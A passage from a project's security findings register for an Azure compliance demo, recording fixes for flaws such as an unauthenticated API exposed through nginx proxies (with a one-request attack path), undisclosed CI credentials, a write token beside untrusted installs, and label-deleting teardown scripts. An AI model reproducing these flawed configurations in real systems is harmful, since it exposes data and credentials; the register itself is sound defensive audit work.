teardown.Tests.ps1` (23), `infra/purview/tests/teardown.Tests.ps1` (15), and
`infra/policy/tests/teardown.Tests.ps1` (26, including three direct unit tests of
`Invoke-AzCli`'s own `$LASTEXITCODE` handling against a local `az` stand-in
function, since the script otherwise has no seam to prove a native-command failure
is actually checked rather than silently ignored). The original 29 all failed
before the three scripts existed (`Invoke-Pester infra/purview/tests,infra/entra/tests,
infra/policy/tests` could not even dot-source them) and all pass after. Each
script's three load-bearing behaviours — the CI refusal, the teardown order, and
the `-WhatIf` no-mutate guarantee — were mutation-tested individually by neutering
exactly that one behaviour, confirming the corresponding test (and only that test)
went red, then restoring the file.

An earlier pass of this entry disclosed a residual gap here and justified it
wrongly; both halves are now resolved rather than merely re-worded.
`infra/entra/teardown.ps1` used to gate every delete through **two** independent
`ShouldProcess` calls — one in each `Remove-*` wrapper, on top of
`Invoke-GraphMutation`'s — so neutering either layer alone left the `-WhatIf`
no-mutate test green and neither layer was actually covered. The stated reason for
keeping the redundancy was that the wrapper's `ShouldProcess` **call** is what
satisfies PSScriptAnalyzer's `PSUseShouldProcessForStateChangingFunctions` rule on
a state-changing verb. **That was false.** The rule is satisfied by *declaring*
`SupportsShouldProcess` and delegating to a command that supports it — demonstrated
by `infra/policy/teardown.ps1`'s own `Remove-PolicyAssignment`,
`Remove-SubscriptionFromManagementGroup` and `Remove-ManagementGroup`, which
declare but never call, delegate to `Invoke-AzMutation`, and score zero findings.
The wrapper-level calls were therefore removed at no analyzer cost, restoring
single-point mutation detection.

Mutations that previously escaped the suite now fail it. Neutering one
`ShouldProcess` layer alone, and dropping the `displayName` filter from a lookup so
it resolves an arbitrary tenant object, both go red — the second closes the more
serious gap, because the suite formerly asserted only how *many* objects were
deleted, never *which*, which for scripts whose entire safety argument is "only
what the manifest names" was the test class that mattered most. A later re-review
found one more that still escaped: hardcoding `Confirmed = $true` in a mutation
helper reintroduced the declined-reported-as-deleted defect while every suite
stayed green, because each decline test mocked the layer doing the deriving. Each
script now exercises the real helper through `-WhatIf` — a genuine, non-interactive
way to make `ShouldProcess` return `$false` — and that mutation is caught in all
three (entra 42/1, Purview 31/1, policy 25/1, against 43/32/26 green). PSScriptAnalyzer reports zero findings at Error or
Warning severity on all three new scripts **and all three new test files**. Full
local suite (`Invoke-Pester -Path scripts,infra,data,verification,compliance`):
833 passed, 0 failed, up from the 769/0 baseline entering this task.

**Stale-claim sweep after the fix:** `docs/runbooks/kill-rebuild.md` § 7 step 1's
`[derived name, per L04]` marker — the one the brief for this task singled out as
"now wrong" — is **removed**, leaving the step as a plain instruction to run
`infra/purview/teardown.ps1`. An interim revision replaced it with a
`(F23, Task 25)` citation; that read as changelog metadata inside a numbered
operator procedure, so it was dropped rather than kept. A repo-wide grep for every other
instance of a teardown-script path paired with a non-existence claim
(`does not exist|missing|never written|derived name`, across every `.md`, `.yml`,
`.ps1` and `.bicep` file) turned up exactly one more hit:
`docs/runbooks/layers/L04.md:148`'s `[derived name — master plan says
'G3-gated script' without a path; placed beside the apply script per repo
convention]`. That one is NOT corrected, because it is not the same kind of claim —
it explains why this documentation chose that particular path (the master plan
named no path at all for L4's teardown; this doc picked the convention of placing
it beside the apply script), not that the path is missing, and it remains
accurate now that the file is real. `L02.md`, `L03.md`, the `layer-02-landing-
zone.yml` and `layer-03-entra.yml` header comments, and `infra/purview/labels.ps1`'s
own docstring were all checked directly and already named the correct paths
without any non-existence claim to begin with.

**Not claimed:** none of the three scripts has ever been run against a live
tenant, a live management group, or a live Purview session — per this branch's
constraint (hard rule 1: authoring is always allowed, executing is not), every
assertion above rests on code reading and the mocked Pester suite, never an
end-to-end run. `infra/policy/teardown.ps1`'s NIST-assignment subscription-scope
handling in particular is inferred from `main.bicep`'s own comment describing how
the AVM pattern module fans that one assignment out, not confirmed against a real
`az policy assignment show` response.

**CM-6 register note:** this finding's second-contributor effect on
`compliance/assessment/CM-6.json` (previously recorded with F18 as its sole
contributor) is recorded in that file directly, not only here — see its
`rationale` and `evidence` fields, updated in this same commit.

---

## Deliberately NOT findings — do not report these

- `apps/vuln-lab`'s three seeded CVEs and two CodeQL flaws are intentional fixtures.
  Verified unreachable: ingress DISABLED (not internal — none), never containerised, no
  import edge from any deployed app.
- CA policies shipping as `enabledForReportingButNotEnforced` — deliberate, so a demo
  tenant cannot lock itself out. It IS recorded as an honest gap against 3.5.3, because an
  adopter would inherit it, but it is not a defect to fix here.
- `mcp-tools` `ingressExternal: true` — required; Copilot Studio calls it from the
  internet.
- `costExportStorage`'s `skuName: 'Standard_LRS'` (`infra/bicep/platform/main.bicep:296`)
  — checked as a possible CP-9 gap during the F16–F18 scrub and dismissed. The comment on
  that line already states the rationale ("cheapest redundancy; exports are reproducible
  data") and it holds: the container holds daily Cost Management exports that Azure will
  regenerate from the billing system on the next scheduled run or an on-demand re-export.
  Nothing unique is lost if the account's single-region copy is unavailable, so LRS is the
  right choice for this specific, reproducible dataset — unlike the Azure SQL database
  (F16), which holds seeded operational data with no equivalent regeneration path.

## Deferred — record as an open gap rather than closing

Azure SQL firewall `0.0.0.0-0.0.0.0` (`platform/main.bicep:257-263`). This is the ARM
sentinel for "allow Azure services" — any Azure tenant's resources reach the TDS endpoint
at the network layer. The risk is genuinely lower than it looks:
`azureADOnlyAuthentication: true` (`:247`), no SQL logins, no passwords,
`minimalTlsVersion: '1.2'`. It is NOT an authentication bypass. But it is a cross-tenant
allow that the repo's own NIST initiative would flag, and a possible denial-of-wallet —
serverless resume may trigger at the gateway before Entra auth, which is SUSPECTED and
worth verifying post-deploy. Fixing it properly needs a VNet-integrated workload profile,
a G2 spend decision. F9's SQL auditing makes attempts visible in the interim.

`Policy.ReadWrite.ConditionalAccess` on the deployer (`scripts/bootstrap/01-root-oidc.ps1`,
`$script:DeployerGraphRoles`, consented Graph application role). This role can disable
Conditional Access tenant-wide, not merely author the CA policies L3 actually needs it
for — a materially larger capability than "create/update the two policies in
`infra/entra/manifest.json`". It is retained deliberately, not an oversight:
`infra/entra/apply-entra.ps1` calls `POST`/`PATCH identity/conditionalAccess/policies`
(`:455`, `:468`) to create and update those policies as part of L3's apply step, and
Microsoft Graph exposes a single application role for writing Conditional Access
policies — there is no narrower one to swap to, unlike F8's `Application.ReadWrite.All`
→ `.OwnedBy`, which was a drop-in. The risk is real: a compromised deployer identity (or
a compromised repo with `id-token: write`) could disable every CA policy in the tenant,
which for this demo means MFA/Conditional Access enforcement for the five fictional
admin users goes dark tenant-wide rather than just for one resource. Not fixed here —
there is no cheaper mitigation available than what Task 10 already did to the
co-located `Application.ReadWrite.All` grant. Tracked as an accepted risk rather than a
defect; see F8 in the index above, whose fix note first flagged this in passing.

---

<a id="f24"></a>
## F24

**data-api's Fabric workspace Viewer grant was expressed but never invoked**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.1.2, 3.1.5 (the same controls F13 maps to -- this is F13's last unlanded grant)
- **Closed by:** the final whole-branch review, commit `782f573`+1
- **Status:** CLOSED

**Found while:** the final whole-branch review of this branch, checking the register's
strongest claims against the tree rather than against itself. F13's entry asserted that
"six of seven workload RBAC grants have landed". Five had.

**What was wrong:** `infra/fabric/provision-workspace.ps1` has carried a
`-DataApiPrincipalId` parameter since Task 12, and `compliance/assessment/3.1.1.json`
described the grant as "wired through provision-workspace.ps1's `-DataApiPrincipalId`
parameter". Nothing passed it. `git grep DataApiPrincipalId -- .github/` returned a
single *comment*, and the script's only caller -- `layer-05-fabric.yml` -- passes
`-VerifierPrincipalId` and never the data-api one. It structurally could not: **L5 runs
before L7**, so the data-api user-assigned identity does not exist at the moment the
Fabric provisioning step runs. The script said so itself, at `:59-61` ("a caller (today,
none -- this is the capability, not yet the wiring) passes it AFTER L7") and at `:144`
("nothing today wires it (that wiring is a separate task)").

That is the identical ordering problem F20 describes for the SQL contained-user grant,
and the third instance of the same shape in the same subsystem -- F20, F21, and now
F24, all "expressed but never invoked", with the first two closed and this one recorded
nowhere until the final review.

**Impact:** a stranger who clones this repo, runs `infra-up.yml`, and completes G0 item
C9 (setting `fabricSqlEndpoint`) flips `dataApiMode` to `cloud` in
`infra/bicep/apps/main.bicep`. `data-api` then connects to the Fabric SQL analytics
endpoint holding **no workspace role at all** and 403s on every lakehouse read -- the
demo's core data path, failing days into a 30-day credit, presenting as a mysterious
runtime error rather than a permissions one. This is verbatim the "dated failure" F13
warns about.

**Fix:** `.github/workflows/layer-07-apps.yml` gained a post-deploy step that resolves
the data-api identity's **principal (object) id** -- the id the Fabric `roleAssignments`
API takes, not the `clientId` the container app consumes -- and calls
`provision-workspace.ps1 -DataApiPrincipalId`, which checks
`Get-FabricWorkspaceRoleAssignment` before POSTing and is therefore a no-op on replay.
Placement and failure posture deliberately mirror Task 22's F20 step: it runs after the
V7.1 manifest is written and uploaded (those steps carry no `always()`), and it carries
`continue-on-error` because the `verify` job needs `deploy` to succeed -- an idempotent
remediation step must not fail a deployment that otherwise worked. Failures are
annotated and written to the run summary rather than swallowed.

The identity is resolved by shape (`az identity list ... contains(name, 'data-api')`)
rather than by a hardcoded name, because `naming.bicep` owns the prefix and environment
(`CLAUDE.md`: never hardcode `mls` elsewhere). Where more than one identity matches, the
step **refuses** rather than granting a workspace role to an arbitrary principal -- the
same refusal the G3 teardown scripts make on an ambiguous display name.

**Not claimed:** this has never run against a live tenant. The step, the object-id
resolution and the grant are verified by code reading and by the workflow-shape
assertions in `verification/tests/workload-rbac.Tests.ps1`'s `F24:` block, which were
mutation-tested (dropping `-DataApiPrincipalId`, and dropping `continue-on-error`, each
turn exactly one assertion red).

---

## F25

**data-api is internet-reachable and unauthenticated through both public frontends**

- **Severity:** critical
- **Confidence:** CONFIRMED (traced end to end)
- **Controls:** 3.1.1, 3.1.2, 3.13.1
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/3.1.1.json`, `compliance/assessment/3.1.2.json`, `compliance/assessment/3.13.1.json`

**Found while:** the final pre-publication audit, checking F1's recorded fix against the
tree rather than against itself.

**Where:** `infra/bicep/apps/main.bicep` (`dataApiApp`: `ingressExternal: false` — F1's
fix, correct as far as it goes); `apps/control-tower/nginx.conf.template` and
`apps/launch-ops/nginx.conf.template` (`location /api/ { proxy_pass ${DATA_API_ORIGIN}/; }`
— a blind proxy: no credential required, no path allowlist); `main.bicep` again (both
frontends `ingressExternal: true` with **no `authConfig`**); `apps/data-api/src/app.ts:80-84`
(the middleware chain is `requestId, securityHeaders, cors, requestSpan, readOnlyGuard` —
no authentication of any kind).

**Attack path:** one request.

    GET https://<control-tower-fqdn>/api/feeds/secure-score

**Impact:** data-api's user-assigned identity holds **Security Reader at SUBSCRIPTION
scope** (`dataApiSecurityReaderGrant`) plus Log Analytics Reader. An anonymous internet
caller reads the adopter's real Defender for Cloud secure score and posture, the
`/feeds/dependabot-alerts` feed and Log Analytics query results — through a dashboard the
adopter believed was a read-only demo. Every cost path F1 described is also still open,
because the requests still land on data-api and still wake serverless SQL.

**What was wrong with F1's closure.** F1's `Fix:` line reads "`ingressExternal: false`;
both frontends already proxy `/api/` server-side." That second clause is the *reason
internal ingress was judged sufficient* — and it is the bypass. The register therefore
handed a reader a working exploit while asserting the finding was closed, which is worse
than an open finding: an open finding is a to-do, a wrongly-closed one is a false
assurance that stops anyone looking again. F1's entry is corrected in place to say so.

**Fix:** Container Apps Easy Auth on **all three** human-facing apps, mirroring the
compliance board's proven pattern — `platform.enabled`,
`globalValidation.unauthenticatedClientAction: 'RedirectToLoginPage'`, an Entra provider
carrying only a public `clientId` and `openIdIssuer`, `tokenStore` disabled, **no client
secret**. Now expressed once, in `main.bicep`'s `entraEasyAuthConfig()` function, and used
by `launchOpsApp`, `controlTowerApp` and `complianceApp`.

Two structural decisions matter more than the config itself:

1. **`ingressExternal` is now literally the same expression as "is Easy Auth configured
   for this app"** (`launchOpsAuthConfigured` / `controlTowerAuthConfigured` /
   `complianceAuthConfigured`). No parameter combination publishes one of these apps to
   the internet without authentication in front of it; a missing client ID costs you an
   app you cannot reach from outside the environment, never an open one.
2. **`.github/workflows/layer-07-apps.yml` refused to deploy** when any of
   `MLS_LAUNCH_OPS_CLIENT_ID`, `MLS_CONTROL_TOWER_CLIENT_ID` or
   `MLS_COMPLIANCE_CLIENT_ID` was unset or empty, naming the missing ones.
   **Superseded by [F36](#f36):** that refusal made the estate undeployable out of the
   box, and the workflow now *resolves* the three client IDs from the app registrations
   L3 creates, deploying whatever is resolvable and reporting the rest. Decision 1 above
   — the fail-closed template — is what actually holds the property, and it is unchanged.

`globalValidation.excludedPaths` is `['/healthz']` and nothing else, so V7.1's
unauthenticated GET still works and nothing under `/api/` is reachable without a session.
`infra/entra/manifest.json` gained `mls-compliance-demo-app`, the fourth app registration
the manifest never declared.

**Rejected alternative:** token-gating the nginx proxy (have the frontend inject a shared
secret on the `/api/` hop). It protects nothing — nginx would inject the token for
anonymous callers exactly as it does for authenticated ones. The only real fix is
authenticating the frontend.

**This changes the demo's access model**, and that is stated plainly in `README.md`,
`docs/runbooks/g0-bootstrap.md` § C9, `docs/runbooks/layers/L07.md`, `L03.md` and
`L12.md`: the dashboards are login-gated now. Publishing a demo that exposes an adopter's
real Defender posture to the internet is the worse trade.

**Not claimed:** nothing here has been deployed. The fix is verified by `az bicep build`,
by `verification/tests/frontend-auth.Tests.ps1` (14 assertions, each mutation-tested), and
by reading the AVM `container-app` 0.23.0 module's own compiled template to confirm that a
`null` `authConfig` skips the child resource and that `excludedPaths` is accepted by the
resource-derived `globalValidation` type.

---

## F26

**The compliance app's Easy Auth guard never fires: a `readEnvironmentVariable` default is unreachable when a workflow feeds it from `vars.*`**

- **Severity:** critical
- **Confidence:** CONFIRMED (reproduced against Bicep CLI 0.46.1)
- **Controls:** 3.1.1, 3.13.1
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Where:** `docs/runbooks/g0-bootstrap.md` § C9 claimed that leaving
`MLS_COMPLIANCE_CLIENT_ID` unset makes `complianceEntraClientId` fall back to the literal
`'unset'`, which "is not a GUID, so **ARM rejects the deployment outright**". The same
claim appeared in `main.bicep`'s own comment, in `.github/README.md`, in
`docs/runbooks/layers/L03.md` and in `L12.md`.

**What is actually true:** `.github/workflows/layer-07-apps.yml` sets
`MLS_COMPLIANCE_CLIENT_ID: ${{ vars.MLS_COMPLIANCE_CLIENT_ID }}`, and **an undefined
GitHub Actions variable expands to the empty string**. The environment variable is
therefore *set*, `readEnvironmentVariable('MLS_COMPLIANCE_CLIENT_ID', 'unset')` returns
`''`, and the `'unset'` sentinel is never reached. Reproduced directly against the Bicep
CLI: variable **unset** → `"unset"`; variable set to the **empty string** → `""`.

**Impact:** the guard that was supposed to stop a NIST control-family board deploying
without authentication did nothing. Combined with F25 it is worse than it looks: this
class of mistake was the only thing standing between three dashboards and the internet.

**Fix:** `isEntraClientIdConfigured()` in `main.bicep` treats **both** the empty string and
the `'unset'` sentinel as not-configured, and each app's `ingressExternal` is derived from
it (see F25). `@minLength(36)` on the parameter was evaluated and **rejected**: Bicep
validates it at *bicepparam compile time* (BCP333), so the repo's own
`az bicep build-params` gate — and every adopter's deploy — would fail on the `'unset'`
default itself, not on the empty string. The workflow-level refusal plus fail-closed
ingress achieves the intent without breaking the gate.

**Sibling, found by the same reasoning and fixed with it:**
`.github/workflows/layer-06-platform.yml` passed
`KEY_VAULT_CREATE_MODE: ${{ vars.KEY_VAULT_CREATE_MODE }}` against
`readEnvironmentVariable('KEY_VAULT_CREATE_MODE', 'default')`. Unset, the parameter
resolved to `''`, which `@allowed(['default', 'recover'])` rejects — **BCP033 at
bicepparam compile time, for every adopter who has not set the variable, which is all of
them on a first run.** Now `${{ vars.KEY_VAULT_CREATE_MODE || 'default' }}`. Every other
`readEnvironmentVariable` default fed from `vars.*` was audited: the ports and
`MLS_LAKEHOUSE_NAME` already carry `|| '<literal>'` fallbacks, and `MLS_SQL_ENDPOINT` /
`MLS_ALERT_EMAIL` default to `''` anyway, so empty and unset are the same value there.

---

## F27

**`workload-rbac.Tests.ps1` verified least privilege by matching comments**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.1, 3.1.2, 3.1.5
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Where:** `verification/tests/workload-rbac.Tests.ps1:69-71` asserted
`$script:MainBicep | Should -Match 'Security Reader'`, and the same for
`'Log Analytics Reader'` and `'Cost Management Reader'`.

**What was wrong:** **every** occurrence of those three strings in
`infra/bicep/apps/main.bicep` is inside a `//` comment or an `@description()`. **Zero are
executable Bicep** — the real role assignments carry only GUIDs. Change a grant to Owner
and the adjacent comment still reads "Security Reader", so the suite stays green while the
estate hands a workload identity full control of the subscription. Given F25 put that
Security Reader grant on the public internet, this is the test that most needed to work.

**Fix:** the assertions run against **comment-and-`@description`-stripped** copies of
`main.bicep`, `modules/workload-role-assignments.bicep` and
`modules/log-analytics-reader-role.bicep`, and check role definition **GUIDs**:
`39bc4728-0917-49c7-9d2c-d95423bc2eb4` (Security Reader),
`72fafb9e-0641-4937-9268-a91bfd8191a3` (Cost Management Reader),
`73c42c96-874c-492b-b04d-ab87d138a893` (Log Analytics Reader). Two new assertions go
further than restoring the old intent: every role-definition GUID literal anywhere in the
layer must be one of those three (a fourth is either an undocumented grant or an
escalation), and Owner, Contributor and User Access Administrator must appear nowhere.

---

## F28

**"No secrets in the repo, and none in CI" is false — and the most damaging instance is incident-response text**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.1.3, 3.5.1
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Where:** `CLAUDE.md` hard rule 5, `SECURITY.md` § Scope, `docs/runbooks/layers/L01.md`
failure mode 4, `docs/runbooks/layers/L06.md`, `docs/runbooks/g0-bootstrap.md` § C9b and
`.github/workflows/gitleaks.yml` (both its header and its "What a finding means" step) all
asserted that CI holds no secret and that the only stored secret in the system is the
Direct Line secret in Key Vault.

**What is actually true — six long-lived credentials:**

| Credential | Where |
|---|---|
| `PURVIEW_CERT_BASE64` / `PURVIEW_CERT_PASSWORD` | `demo` environment secret (Entra app X.509) |
| `MLS_VERIFIER_CERT_BASE64` / `MLS_VERIFIER_CERT_PASSWORD` | `verify` environment secret (Entra app X.509) |
| `SELF_HEAL_TOKEN` | repository secret — a PAT with `repo` **write** |
| `MLS_VERIFIER_GH_TOKEN` | `verify` environment secret |
| Direct Line secret | Key Vault |
| `mcp-auth-token` | Key Vault |

`g0-bootstrap.md` § C9b disclosed four of them honestly *in a table* while asserting the
false sentence immediately above it — which is how a claim like this survives review.

**Impact, and why this is not merely a documentation nit:** `gitleaks.yml`'s failure step
is **incident-response text**. On a real leak it told the responder that the only
credential to rotate was the Direct Line secret, and that "everything Azure is OIDC, so
there is no cloud credential to rotate" — sending them away with six live credentials
un-rotated, including a PAT that can write to this repository.

**Fix:** `gitleaks.yml` first — its failure step now prints the complete rotation table
above, with where each credential lives and how to rotate it, and says to rotate
`SELF_HEAL_TOKEN` first if you cannot tell what leaked. `CLAUDE.md`, `SECURITY.md`,
`L01.md`, `L06.md` and `g0-bootstrap.md` are corrected to match, each stating why every
credential exists (no federated path) and pointing at the workflow as the canonical
rotation list. **No code changed:** the six credentials are all justified. The claim was
the defect.

---

## F29

**The self-heal auto-merge "gauntlet" claim names two structurally unreachable legs**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** — (integrity of an unattended-merge justification)
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Where:** `.github/workflows/self-heal.yml:94-97` justified merging machine-authored code
without human approval because the PR "must clear the SAME gauntlet as any other change —
lint-ci, both test suites, CodeQL, gitleaks, the Trivy CRITICAL gate, and ZAP."

**What was wrong:** two of the six named legs cannot run on a heal PR at all. `zap.yml`
has only `workflow_call` and `workflow_dispatch` triggers, so it produces no check run on
a pull request and can never be a required check on one. The Trivy CRITICAL gate lives
only in the five `app-*-ci.yml` workflows, whose `pull_request` `paths:` filters are
`apps/<app>/**` plus the **root** `package.json`/`package-lock.json` — none of which
matches a heal PR touching `apps/vuln-lab/package*.json`.

**Impact:** the justification for merging machine-written code with no human in the loop
was overstated by a third. What actually gates a heal PR is `lint-ci`, `codeql` and
`gitleaks` — a reasonable gate, and now what the comment says.

**Fix:** the comment enumerates what actually runs and, separately, what does not and why,
with a note that the list is the justification for unattended merge and is worth exactly
what it runs. No workflow behaviour changed.

---

## F30

**`sbom.yml` held a write token in the same job as `npm ci` of known-CVE packages and a floating third-party action**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** 3.4.1, 3.14.1 (supply chain)
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Where:** `.github/workflows/sbom.yml` — one job with `permissions: contents: write`
(`:54`) that also ran `npm ci` **and** `npm ci --prefix apps/vuln-lab` (installing packages
with deliberately seeded CVEs, and executing their `postinstall` scripts) **and**
`anchore/sbom-action@v0`, a floating major on a 0.x action, with `actions/checkout`'s
`persist-credentials` defaulted true — so `GITHUB_TOKEN` sat in `.git/config` while all of
that ran.

**Why this one is embarrassing rather than merely wrong:** `compliance.yml` documents this
exact rule in its own "WHY TWO JOBS" block — "a job that can push to the default branch
must not also resolve and execute third-party code, because a compromised or typo-squatted
dependency then inherits a write token" — and `sbom.yml` broke it.

**Fix:** split, mirroring `compliance.yml`'s own two-job pattern. `generate` holds
`contents: read`, checks out with `persist-credentials: false`, and does all the work;
`attach` holds `contents: write`, installs nothing, checks out nothing, downloads the
documents `generate` produced and calls `gh release upload`.

---

## F31

**L9 switched off a Defender for Containers plan it did not enable, and called it a spend decrease**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** SI-4 (and G2's own integrity)
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Where:** `.github/workflows/layer-09-devsecops.yml` — the "Disable the plan (spend
decrease, no gate)" step ran under `if: always()`, and `defender_toggle` defaults **true**.

**Impact:** an adopter whose subscription already ran Defender for Containers — a paid
security control, at subscription scope — had it **silently switched off** at the end of
every L9 run, and the run summary reported that as "a spend DECREASE, so no gate applies".
That is true about cost and wrong about everything else: the gate framework asks only
"does this cost more?", so a change that removes a security control passes it unexamined.

**Fix:** restore-what-you-found. A new step reads the plan's incoming `pricingTier` before
anything is touched. If it is anything but `Free`, the job **refuses** — it changes
nothing, explains why, and tells the operator to re-run with `defender_toggle: false`. The
disable and its assertion are additionally gated on the incoming state having been `Free`,
so the round-trip can only ever undo its own enable. `docs/runbooks/layers/L09.md` records
the behaviour and points at the dedicated-subscription requirement (F35).

---

## F32

**The Purview teardown deletes an adopter's real sensitivity labels, and the apply path silently rewrites them**

- **Severity:** critical
- **Confidence:** CONFIRMED
- **Controls:** CM-6, 3.8.4
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Where:** `infra/purview/teardown.ps1` — `Get-LabelTaxonomy` returned the bare names
`'Public'`, `'Internal'`, `'Confidential'`, `'Export-Controlled'`, and
`Remove-SensitivityLabel` called `Remove-Label -Identity $Name` with **no ownership check
whatsoever**. `verification/reports/label-guids.json` was named in the script's own G3
warning banner and in its `.NOTES`, and was **never read**.
`infra/purview/labels.ps1`'s `Initialize-SensitivityLabel` declared
`SupportsShouldProcess` but no `ConfirmImpact = 'High'`, and
`.github/workflows/layer-04-purview.yml` runs it with `-Confirm:$false`.

**Impact:** those are three of the most common sensitivity-label names in existence. An
adopter with an existing Microsoft Purview taxonomy loses `Confidential` to a G3 teardown
— and **every document already labelled with it loses its classification and its
protection**, which recreating a label of the same name does not undo, because the GUID
changes. The apply path is as bad in the other direction: the adopter's production
`Confidential` is detected as *drifted* (its tooltip is not the demo's) and **silently
rewritten with demo tooltip text, in CI, with no prompt**.

**Fix, two independent controls:**

1. **Prefix.** `Get-LabelTaxonomy` in both scripts takes a `-Prefix` resolved by a new
   `Get-CompanyPrefix`, which parses `defaultCompanyPrefix` out of
   `infra/bicep/naming.bicep` — the same helper, parsed the same way, that
   `scripts/down.ps1` and `infra/policy/teardown.ps1` already use, because CLAUDE.md
   forbids hardcoding the prefix anywhere else. Labels are `<prefix>-public`,
   `<prefix>-internal`, `<prefix>-confidential`, `<prefix>-export-controlled`; `Name` and
   `DisplayName` are the same string so that `Get-Label -Identity` and the audit's
   `DisplayName` match address exactly the objects this estate created. The policy name is
   prefixed too. Both scripts **refuse to run** rather than guess if `naming.bicep` cannot
   be parsed.
2. **GUID ownership.** `Remove-SensitivityLabel` now takes the set of GUIDs recorded in
   `verification/reports/label-guids.json` and deletes a label **only** when the object the
   tenant returned carries one of them. No baseline file, no readable GUID, or a GUID that
   is not in the baseline are all `Refused` — reported distinctly from `Declined` and
   `WhatIf`, and checked *before* `$WhatIfPreference`, so a `-WhatIf` rehearsal tells the
   operator which labels are not theirs before they approve G3.

`Initialize-SensitivityLabel` also gained `ConfirmImpact = 'High'` on the function that
actually calls `ShouldProcess` (it does not propagate from a caller). That does not stop
the CI path, which passes `-Confirm:$false`; the prefix is what protects an adopter there.

`verification/layer-04-audit.ps1` moved with it: its `-ExpectedLabel` and
`-ExpectedLabelPolicy` defaults resolve from the same prefix, because an audit still
looking for the bare words would have matched an adopter's own taxonomy and reported a
healthy demo built out of someone else's labels. `docs/runbooks/layers/L04.md`,
`kill-rebuild.md`, `auto-label-design.md`, `scripts/down.ps1`, the L4 workflow header and
the master plan all name the prefixed labels now.

---

## F33

**Zero of 263 `uses:` references were SHA-pinned — and one of them did not resolve at all**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** 3.4.1 (supply chain)
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED for the seven third-party actions that run in privileged jobs

**Where:** every workflow. The seven that matter: `anchore/sbom-action@v0` (a floating
**major** on a 0.x action), `gitleaks/gitleaks-action@v2`, `docker/build-push-action@v6`,
`docker/setup-buildx-action@v3`, `docker/login-action@v3`,
`aquasecurity/trivy-action@0.28.0`, `zaproxy/action-baseline@v0.14.0`. The docker and
Trivy ones run in `packages: write` jobs beside a live GHCR credential: a moved tag
publishes a backdoored image that L7 then deploys.

**Found while pinning:** `aquasecurity/trivy-action@0.28.0` **does not resolve to any ref
in that repository.** Its tags are `v0.28.0` (plus a single unprefixed `0.35.0`); there is
no `0.28.0` tag and no branch of that name. Every Trivy step in this repo — the five app
CI gates and the three in `layer-09-devsecops.yml`, including both halves of V9.2's
negative test — was therefore failing to resolve its action. Pinning by SHA fixes that as
a side effect, which is itself an argument for pinning.

**Fix:** all seven pinned to the commit SHA their tag currently resolves to, with the
version kept as a trailing comment (`@<sha> # v3`) — 36 `uses:` lines across nine
workflows. `.github/dependabot.yml` already registers the `github-actions` ecosystem, so
the pins stay maintained. First-party `actions/*` references are deliberately left on
tags.

---

## F34

**`.superpowers/` was excluded only by a nested ignore file**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** 3.1.3
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Where:** the only rule covering 3.3 MB of agent transcripts and working notes was
`.superpowers/sdd/.gitignore` containing `*` — one directory *below* the directory that
needed ignoring. Moving `.superpowers/`, adding any sibling under it, or a single
`git add -f` would have swept the lot into a public repository.

**Fix:** `.superpowers/` added to the **root** `.gitignore`, where the rule survives a
reorganisation.

---

## F35

**Subscription-wide DENY policy, nowhere stated as requiring a dedicated subscription**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** CM-6
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Where:** `README.md`, `SECURITY.md` and `docs/runbooks/g0-bootstrap.md` all describe
cost, gates and trial strategy at length, and none of them said that this repository
assigns **subscription-wide DENY policy**: six `require-<tag>` deny rules on resource
groups and an `allowed-locations` deny on every resource
(`infra/bicep/landing-zone/main.bicep`).

**Impact for a stranger deploying this into their own tenant:** those policies apply to
**everything already in the subscription**, not only to what the demo creates. The next
deployment anyone makes without the six required tags, or into a location outside the
allowlist, is refused — by a demo they installed to look at. Alongside it: a NIST SP
800-53 R5 initiative and a budget at subscription scope, `data-api`'s Security Reader
grant **across the whole subscription** (F25), the L9 Defender pricing-plan round-trip
(F31), and an `infra-down.yml` that deletes four resource groups by name.

**Fix:** stated as a requirement, not a suggestion, at the top of `README.md`, in its own
`SECURITY.md` section, and in a callout at the head of `g0-bootstrap.md`. No code changed
— the policies are the point of the demo. The omission was the defect.

---

## F36

**F25's fix was secure and undeployable: L7 refused to run without three hand-set client IDs, and the redirect URIs they needed could not exist until it had run**

- **Severity:** high
- **Confidence:** CONFIRMED (read end to end against the tree)
- **Controls:** — (availability / adoptability; it protects F25's 3.1.1, 3.1.2, 3.13.1 fix by keeping it reachable)
- **Closed by:** the final pre-publication security audit
- **Status:** CLOSED

**Found while:** checking, in the position of a stranger cloning this repo, whether the
F25/F26 remediation could actually be deployed — the same lens that produced F25 itself.

**Where:** `.github/workflows/layer-07-apps.yml:160-190` (the "Require an Entra client ID
for every externally-reachable app" step, since deleted): the first step of the `deploy`
job hard-refused the whole L7 deployment unless `MLS_LAUNCH_OPS_CLIENT_ID`,
`MLS_CONTROL_TOWER_CLIENT_ID` and `MLS_COMPLIANCE_CLIENT_ID` were all set as GitHub
environment variables. Also `docs/runbooks/layers/L03.md`, which closed its L7 note with
"register the apps here, run L7, then add the redirect URIs" — a manual third step.

**Impact.** An adopter's first `infra-up` could not deploy L7 at all. To get past it they
had to run L3, open the portal, copy three application IDs into GitHub variables, run L7,
read three ingress FQDNs out of the run, and go back to the portal to add three redirect
URIs — because Easy Auth's reply URL is
`https://<that app's ingress FQDN>/.auth/login/aad/callback`, and the FQDN does not exist
until the app the refusal was blocking has deployed. That is a chicken-and-egg with a
manual resolution, in a repo whose stated purpose is being cloned and deployed. F25 was
